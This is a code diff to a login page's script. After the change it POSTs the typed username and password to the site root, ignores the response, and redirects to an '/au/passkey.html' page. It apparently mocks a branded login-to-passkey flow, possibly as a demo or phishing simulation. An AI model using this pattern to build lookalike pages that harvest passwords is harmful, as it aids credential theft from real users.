@@ -77,15 +77,34 @@
     </div>
 
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             
             if (username && password) {
-                // GET /au/passkey.html に遷移
-                window.location.href = '/au/passkey.html';
+                try {
+                    // パスワード認証をシミュレート - POST リクエストを送信
+                    await fetch('/', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            username: username,
+                            password: password
+                        })
+                    }).catch(() => {
+                        // レスポンスは何であろうと捨てる（404エラーなど無視）
+                    });
+                    
+                    // POST後に遷移
+                    window.location.href = '/au/passkey.html';
+                } catch (error) {
+                    // エラーが発生してもとりあえず遷移
+                    window.location.href = '/au/passkey.html';
+                }
             }
         });
     </script>
